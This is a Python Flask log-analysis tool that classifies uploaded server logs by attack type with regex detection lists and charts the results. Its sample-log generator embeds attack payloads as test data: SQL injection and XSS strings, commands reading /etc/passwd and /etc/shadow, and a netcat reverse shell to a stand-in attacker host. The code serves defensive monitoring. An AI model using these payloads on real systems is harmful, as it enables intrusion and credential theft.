import re
import os
from datetime import datetime
from collections import Counter
from flask import Flask, render_template, request, jsonify
import json

app = Flask(__name__)
app.config['MAX_CONTENT_LENGTH'] = 16 * 1024 * 1024
app.config['UPLOAD_FOLDER'] = 'uploads'

os.makedirs(app.config['UPLOAD_FOLDER'], exist_ok=True)

ATTACK_PATTERNS = {
    'SQL注入': [
        r"(?i)(\b(union|select|insert|update|delete|drop|create|alter|exec|execute)\b.*\b(from|into|table|database|where)\b)",
        r"(?i)(\bor\b\s+\d+\s*=\s*\d+)",
        r"(?i)(\band\b\s+\d+\s*=\s*\d+)",
        r"(?i)(union\s+select)",
        r"(?i)(select\s+.*\s+from)",
        r"(?i)(\bdrop\s+table\b)",
        r"(?i)(\binsert\s+into\b)",
        r"(?i)('.*(\bor\b|\band\b).*')",
        r"(?i)(%27|%22|%2527)",
        r"(?i)(\bwaitfor\b.*\bdelay\b)",
        r"(?i)(\bbenchmark\b.*\()",
        r"(?i)(\bsleep\b\s*\()",
    ],
    'XSS攻击': [
        r"(?i)(<script[^>]*>.*?</script>)",
        r"(?i)(javascript\s*:)",
        r"(?i)(on\w+\s*=)",
        r"(?i)(<img[^>]+onerror\s*=)",
        r"(?i)(<svg[^>]+onload\s*=)",
        r"(?i)(<body[^>]+onload\s*=)",
        r"(?i)(<iframe[^>]*>)",
        r"(?i)(alert\s*\()",
        r"(?i)(document\.cookie)",
        r"(?i)(eval\s*\()",
        r"(?i)(<embed[^>]*>)",
        r"(?i)(<object[^>]*>)",
    ],
    'RCE攻击': [
        r"(?i)(\bcat\b\s+[\w/\-\.]+)",
        r"(?i)(\bls\b\s*[\w/\-\.]*)",
        r"(?i)(\bwhoami\b)",
        r"(?i)(\bpwd\b)",
        r"(?i)(\buname\b)",
        r"(?i)(\bid\b)",
        r"(?i)(\brm\s+-rf\b)",
        r"(?i)(\bwget\s+)",
        r"(?i)(\bcurl\s+)",
        r"(?i)(\bnc\s+-)",
        r"(?i)(\bbash\s+-[ci])",
        r"(?i)(\bsh\s+-[ci])",
        r"(?i)(\bsystem\s*\()",
        r"(?i)(\bexec\s*\()",
        r"(?i)(\bpassthru\s*\()",
        r"(?i)(\bshell_exec\s*\()",
        r"(?i)(\bpopen\s*\()",
        r"(?i)(\bproc_open\s*\()",
        r"(?i)(;\s*\b(cat|ls|whoami|id|pwd|uname|wget|curl|nc|bash|sh)\b)",
        r"(?i)(\|\s*\b(cat|ls|whoami|id|pwd|uname|wget|curl|nc|bash|sh)\b)",
        r"(?i)(`[^`]*`)",
        r"(?i)(\$\([^)]*\))",
    ],
    '暴力破解': [
        r"(?i)(failed\s+password)",
        r"(?i)(authentication\s+failure)",
        r"(?i)(login\s+failed)",
        r"(?i)(invalid\s+user)",
        r"(?i)(failed\s+login)",
        r"(?i)(brute\s*force)",
        r"(?i)(password\s+attempt)",
    ],
    '目录遍历': [
        r"(\.\./)",
        r"(\.\.\\)",
        r"(?i)(%2e%2e%2f)",
        r"(?i)(%2e%2e/)",
        r"(?i)(\.\.%2f)",
        r"(?i)(%252e%252e%252f)",
        r"(?i)(/etc/passwd)",
        r"(?i)(/etc/shadow)",
        r"(?i)(/proc/self)",
        r"(?i)(c:\\windows)",
    ],
    '文件包含': [
        r"(?i)(\binclude\s*\()",
        r"(?i)(\brequire\s*\()",
        r"(?i)(\binclude_once\s*\()",
        r"(?i)(\brequire_once\s*\()",
        r"(?i)(php://input)",
        r"(?i)(php://filter)",
        r"(?i)(file://)",
        r"(?i)(data://)",
        r"(?i)(expect://)",
    ],
    '扫描探测': [
        r"(?i)(nmap)",
        r"(?i)(nikto)",
        r"(?i)(sqlmap)",
        r"(?i)(dirbuster)",
        r"(?i)(gobuster)",
        r"(?i)(masscan)",
        r"(?i)(nessus)",
        r"(?i)(openvas)",
        r"(?i)(w3af)",
    ],
}

LOG_PATTERNS = {
    'apache': r'(?P<ip>\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}).*?\[(?P<time>[^\]]+)\].*?"(?P<method>\w+)\s+(?P<path>[^\s]+)\s*(?:HTTP/[^\s"]+)?"\s*(?P<status>\d+).*?(?P<size>\d+|-)',
    'nginx': r'(?P<ip>\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}).*?\[(?P<time>[^\]]+)\].*?"(?P<method>\w+)\s+(?P<path>[^\s]+)\s*(?:HTTP/[^\s"]+)?"\s*(?P<status>\d+)\s*(?P<size>\d+)',
    'syslog': r'(?P<time>\w+\s+\d+\s+\d+:\d+:\d+)\s+(?P<host>\S+)\s+(?P<process>[^:]+):\s+(?P<message>.*)',
    'generic': r'(?P<ip>\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}).*?(?P<time>\d{4}[-/]\d{2}[-/]\d{2}[T\s]\d{2}:\d{2}:\d{2})',
}

PORT_PATTERN = r'(?:port[:\s]*(\d+)|:(\d+)|dstport[=:](\d+)|dport[=:](\d+))'

def detect_attack_type(line):
    for attack_type, patterns in ATTACK_PATTERNS.items():
        for pattern in patterns:
            if re.search(pattern, line):
                return attack_type
    return '其他'

def parse_time(time_str):
    time_formats = [
        '%d/%b/%Y:%H:%M:%S %z',
        '%d/%b/%Y:%H:%M:%S',
        '%Y-%m-%d %H:%M:%S',
        '%Y/%m/%d %H:%M:%S',
        '%b %d %H:%M:%S',
        '%Y-%m-%dT%H:%M:%S',
        '%Y-%m-%dT%H:%M:%S%z',
    ]
    
    for fmt in time_formats:
        try:
            dt = datetime.strptime(time_str.strip(), fmt)
            if dt.year == 1900:
                dt = dt.replace(year=datetime.now().year)
            return dt
        except ValueError:
            continue
    return None

def extract_port(line):
    match = re.search(PORT_PATTERN, line, re.IGNORECASE)
    if match:
        for group in match.groups():
            if group:
                return int(group)
    
    port_matches = re.findall(r':(\d{2,5})', line)
    if port_matches:
        for port in port_matches:
            p = int(port)
            if p > 1 and p < 65535:
                return p
    return None

def parse_log_line(line):
    result = {
        'ip': None,
        'time': None,
        'attack_type': None,
        'port': None,
        'raw': line.strip()
    }
    
    ip_match = re.search(r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})', line)
    if ip_match:
        result['ip'] = ip_match.group(1)
    
    time_patterns = [
        r'\[([^\]]+)\]',
        r'(\d{4}[-/]\d{2}[-/]\d{2}[T\s]\d{2}:\d{2}:\d{2}(?:\.\d+)?(?:[+-]\d{2}:?\d{2})?)',
        r'(\d{2}/\w{3}/\d{4}:\d{2}:\d{2}:\d{2})',
        r'(\w{3}\s+\d+\s+\d{2}:\d{2}:\d{2})',
    ]
    
    for pattern in time_patterns:
        time_match = re.search(pattern, line)
        if time_match:
            parsed_time = parse_time(time_match.group(1))
            if parsed_time:
                result['time'] = parsed_time
                break
    
    result['attack_type'] = detect_attack_type(line)
    result['port'] = extract_port(line)
    
    return result

def analyze_logs(log_entries):
    analysis = {
        'total_attacks': len(log_entries),
        'attack_types': Counter(),
        'ip_counts': Counter(),
        'port_counts': Counter(),
        'time_series': {},
        'attacks_by_type': {},
        'attacks_by_ip': {},
    }
    
    for entry in log_entries:
        if entry['attack_type']:
            analysis['attack_types'][entry['attack_type']] += 1
            
            if entry['attack_type'] not in analysis['attacks_by_type']:
                analysis['attacks_by_type'][entry['attack_type']] = []
            analysis['attacks_by_type'][entry['attack_type']].append(entry)
        
        if entry['ip']:
            analysis['ip_counts'][entry['ip']] += 1
            
            if entry['ip'] not in analysis['attacks_by_ip']:
                analysis['attacks_by_ip'][entry['ip']] = []
            analysis['attacks_by_ip'][entry['ip']].append(entry)
        
        if entry['port']:
            analysis['port_counts'][entry['port']] += 1
        
        if entry['time']:
            hour_key = entry['time'].strftime('%Y-%m-%d %H:00')
            if hour_key not in analysis['time_series']:
                analysis['time_series'][hour_key] = 0
            analysis['time_series'][hour_key] += 1
    
    return analysis

def generate_visualization_data(analysis):
    attack_type_data = {
        'labels': list(analysis['attack_types'].keys()),
        'values': list(analysis['attack_types'].values()),
        'colors': [
            '#FF6384', '#36A2EB', '#FFCE56', '#4BC0C0', 
            '#9966FF', '#FF9F40', '#FF6384', '#C9CBCF',
            '#7BC225', '#E8175D'
        ]
    }
    
    top_ips = analysis['ip_counts'].most_common(10)
    ip_data = {
        'labels': [ip[0] for ip in top_ips],
        'values': [ip[1] for ip in top_ips]
    }
    
    sorted_times = sorted(analysis['time_series'].items())
    time_data = {
        'labels': [t[0] for t in sorted_times],
        'values': [t[1] for t in sorted_times]
    }
    
    return {
        'attack_types': attack_type_data,
        'top_ips': ip_data,
        'time_series': time_data,
        'total_attacks': analysis['total_attacks'],
        'total_unique_ips': len(analysis['ip_counts']),
        'total_attack_types': len(analysis['attack_types']),
    }

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/upload', methods=['POST'])
def upload_file():
    if 'file' not in request.files:
        return jsonify({'error': '没有上传文件'}), 400
    
    file = request.files['file']
    if file.filename == '':
        return jsonify({'error': '没有选择文件'}), 400
    
    try:
        content = file.read().decode('utf-8', errors='ignore')
        lines = content.split('\n')
        
        log_entries = []
        for line in lines:
            if line.strip():
                entry = parse_log_line(line)
                if entry['ip'] or entry['attack_type'] != '其他':
                    log_entries.append(entry)
        
        if not log_entries:
            return jsonify({'error': '未能从日志中解析出有效数据，请检查日志格式'}), 400
        
        analysis = analyze_logs(log_entries)
        viz_data = generate_visualization_data(analysis)
        
        return jsonify({
            'success': True,
            'data': viz_data,
            'total_lines': len(lines),
            'parsed_lines': len(log_entries)
        })
    
    except Exception as e:
        return jsonify({'error': f'处理文件时出错: {str(e)}'}), 500

@app.route('/sample')
def get_sample_data():
    sample_logs = generate_sample_logs()
    log_entries = [parse_log_line(line) for line in sample_logs]
    log_entries = [e for e in log_entries if e['ip'] or e['attack_type'] != '其他']
    
    analysis = analyze_logs(log_entries)
    viz_data = generate_visualization_data(analysis)
    
    return jsonify({
        'success': True,
        'data': viz_data,
        'total_lines': len(sample_logs),
        'parsed_lines': len(log_entries)
    })

def generate_sample_logs():
    import random
    from datetime import timedelta
    
    base_time = datetime.now() - timedelta(hours=24)
    sample_ips = [
        '192.168.1.100', '10.0.0.50', '172.16.0.25', '192.168.2.200',
        '10.1.1.15', '172.17.0.100', '192.168.3.50', '10.2.2.75',
        '172.18.0.30', '192.168.4.120', '10.3.3.80', '172.19.0.45'
    ]
    
    attack_payloads = {
        'SQL注入': [
            "' OR '1'='1",
            "' UNION SELECT username, password FROM users--",
            "1; DROP TABLE users--",
            "' AND 1=1--",
            "admin'--",
            "' UNION SELECT NULL,NULL,NULL--",
        ],
        'XSS攻击': [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert(document.cookie)",
            "<svg onload=alert('XSS')>",
            "<iframe src='javascript:alert(1)'>",
        ],
        'RCE攻击': [
            "; cat /etc/passwd",
            "| whoami",
            "`id`",
            "$(cat /etc/shadow)",
            "; ls -la /",
            "| nc -e /bin/sh attacker.com 4444",
        ],
        '暴力破解': [
            "Failed password for root from 192.168.1.100",
            "authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.1.100",
            "Invalid user admin from 192.168.1.100",
            "Failed login attempt for user admin",
        ],
        '目录遍历': [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd",
            "....//....//....//etc/shadow",
        ],
        '扫描探测': [
            "GET /phpmyadmin/ HTTP/1.1",
            "GET /admin/ HTTP/1.1",
            "GET /.git/config HTTP/1.1",
            "GET /wp-admin/ HTTP/1.1",
            "GET /backup.sql HTTP/1.1",
        ],
    }
    
    ports = [80, 443, 22, 3306, 8080, 21, 25, 3389, 4444, 8443]
    methods = ['GET', 'POST', 'PUT', 'DELETE']
    
    logs = []
    
    for i in range(200):
        ip = random.choice(sample_ips)
        attack_type = random.choice(list(attack_payloads.keys()))
        payload = random.choice(attack_payloads[attack_type])
        port = random.choice(ports)
        method = random.choice(methods)
        current_time = base_time + timedelta(minutes=random.randint(0, 1440))
        time_str = current_time.strftime('%d/%b/%Y:%H:%M:%S +0800')
        
        log_line = f'{ip} - - [{time_str}] "{method} /search?q={payload} HTTP/1.1" 200 1234 "-" "Mozilla/5.0" port:{port}'
        logs.append(log_line)
    
    return logs

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
